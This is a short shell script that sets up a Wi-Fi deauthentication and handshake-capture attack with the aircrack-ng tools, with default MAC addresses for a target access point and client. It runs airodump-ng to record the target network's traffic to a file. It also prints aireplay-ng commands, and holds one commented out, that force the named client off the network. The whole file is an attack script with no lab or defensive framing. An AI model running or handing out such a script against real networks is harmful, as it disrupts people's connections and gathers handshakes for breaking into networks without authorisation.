IFACE=wlan20
if [ "$1" = "" ];
then
   CHANNEL=7
else
   CHANNEL=$1
fi
if [ "$2" = "" ];
then      
   BSSID=88:03:55:07:ED:37
else
   BSSID=$2
fi
if [ "$3" = "" ];
then      
   CLIENTE=00:25:D3:0B:71:15
else
   CLIENTE=$3
fi      
echo aireplay-ng -0 6 -a $BSSID -c $CLIENTE $IFACE
airodump-ng -c $CHANNEL --bssid $BSSID --showack -w capture $IFACE 
#aireplay-ng -0 5 -a 00:1D:7E:64:9A:7C -c 00:25:D3:0B:71:15 mon0
echo aireplay-ng -0 6 -a $BSSID -c $CLIENTE $IFACE
